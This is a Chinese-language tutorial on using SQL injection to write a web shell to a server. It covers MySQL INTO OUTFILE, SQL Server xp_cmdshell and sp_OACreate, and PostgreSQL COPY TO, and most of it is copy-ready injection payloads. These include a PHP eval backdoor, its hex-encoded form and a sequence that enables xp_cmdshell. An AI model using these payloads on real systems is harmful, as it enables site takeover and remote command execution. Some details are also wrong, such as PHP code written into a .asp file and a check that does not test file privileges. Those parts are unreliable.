### SQL 注入怎么写入 WebShell

这种攻击方式的成功与否，主要取决于以下几个前提条件：

- **数据库账户权限**：当前连接数据库的账户必须具备 `File` 权限，或者说有权限执行 `LOAD_FILE()`、`INTO OUTFILE` 或 `INTO DUMPFILE` 等文件操作函数
- **目标路径可写**：网站服务器上的目标路径必须是可写的，且不能被权限系统限制
- **WAF 或防护软件**：没有强大的 WAF (Web Application Firewall) 或其他安全软件拦截注入语句

**1. MySQL：`INTO OUTFILE`**

这是最常用且最直接的写入 WebShell 的方法。`INTO OUTFILE` 语句能够将查询结果导出到一个指定的文件中

**利用步骤：**

1. **判断权限**：首先，需要判断当前数据库用户是否具有 `File` 权限。可以尝试执行以下语句：

   ```sql
   ?id=1' AND (SELECT count(*) FROM mysql.user)>0--+
   ```

   如果返回正常，则可以初步判断有权限。更直接的方式是尝试利用 `@@basedir` 或 `@@datadir` 查看路径是否可写

2. **获取网站绝对路径**：如果不知道网站的绝对路径，可以尝试利用报错或联合查询来获取

   ```sql
   # 利用报错获取
   ?id=1' AND (SELECT 1 FROM (SELECT count(*), concat(@@basedir,floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--+
   ```

   或者尝试猜测一些常见的路径，例如 `/var/www/html/`、`C:/inetpub/wwwroot/` 等

3. **构造注入语句**：将包含 WebShell 代码的字符串作为查询结果，然后使用 `INTO OUTFILE` 导出到目标路径

   ```sql
   # 假设我们想写入一个名为 shell.php 的文件
   ?id=1' UNION SELECT 1, '<?php eval($_POST[cmd]);?>' INTO OUTFILE '/var/www/html/shell.php'--+
   ```

   **注意：**

   - `INTO OUTFILE` 导出时会以行的形式输出，每行末尾会有换行符，且不能覆盖已有文件。为了解决这个问题，通常会结合十六进制编码或 `LOAD_FILE()` 来绕过
   - 为了避免转义和换行问题，WebShell 代码通常会用十六进制进行编码

   ```sql
   ?id=1' UNION SELECT 1, 0x3c3f706870206576616c28245f504f53545b636d645d293b3f3e INTO OUTFILE '/var/www/html/shell.php'--+
   ```

**2. SQL Server：`xp_cmdshell`**

`xp_cmdshell` 是 SQL Server 的一个扩展存储过程，它允许在数据库中执行操作系统命令。如果它被启用，攻击者就可以直接执行命令来写入 WebShell

#### **利用步骤：**

1. **判断 `xp_cmdshell` 是否启用**：默认情况下，`xp_cmdshell` 是禁用的

   ```sql
   ;EXEC xp_cmdshell 'dir c:'--
   ```

   如果执行成功，说明已启用。如果没有，则需要尝试启用它

2. **启用 `xp_cmdshell`**：

   ```sql
   ;EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--
   ```

   **注意：** 启用 `xp_cmdshell` 需要较高的权限（通常是 `sysadmin` 角色）

3. **写入 WebShell**：启用 `xp_cmdshell` 后，可以使用 `echo` 命令将 WebShell 代码写入文件

   ```sql
   ;EXEC xp_cmdshell 'echo ^<^?php eval($_POST[cmd])?^> > C:\inetpub\wwwroot\shell.asp'--
   ```

   `^` 是为了转义特殊字符 `<`、`>` 等

**3. SQL Server：`sp_OACreate`**

如果 `xp_cmdshell` 被禁用，攻击者还可以利用 `sp_OACreate` 等 OLE 自动化存储过程来执行命令

- **利用方式**：利用 `sp_OACreate` 创建一个 `WScript.Shell` 对象，然后通过其 `Run` 方法执行命令

  ```sql
  ;DECLARE @o INT; EXEC sp_OACreate 'WScript.Shell', @o OUT; EXEC sp_OAMethod @o, 'Run', NULL, 'cmd.exe /c echo ^<^?php eval($_POST[cmd])?^> > C:\inetpub\wwwroot\shell.asp'--
  ```

**4. PostgreSQL：`COPY TO`**

PostgreSQL 提供了 `COPY TO` 命令，用于将表数据导出到文件中

- **利用方式**：

  1. 创建一个临时表，并将 WebShell 代码插入其中
  2. 利用 `COPY TO` 命令将数据导出到目标文件

  ```sql
  '; CREATE TABLE shell (cmd text); INSERT INTO shell VALUES ('<?php eval($_POST[cmd]);?>'); COPY shell TO '/var/www/html/shell.php';--
  ```

  **注意：** 执行 `COPY` 命令需要 `superuser` 权限，且目标路径必须是数据库服务器可读写的